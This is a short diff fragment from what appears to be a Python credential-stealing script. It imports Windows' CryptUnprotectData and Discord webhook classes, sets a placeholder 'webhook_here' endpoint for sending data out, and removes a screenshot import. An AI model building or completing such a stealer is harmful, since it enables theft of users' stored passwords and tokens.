@@ -14,7 +14,6 @@ from discord import Embed, RequestsWebhookAdapter, Webhook
 from httpx import get as httpget
 from requests import get
 from win32crypt import CryptUnprotectData
-from PIL import ImageGrab
 
 webhook = "&webhook_here&"
 
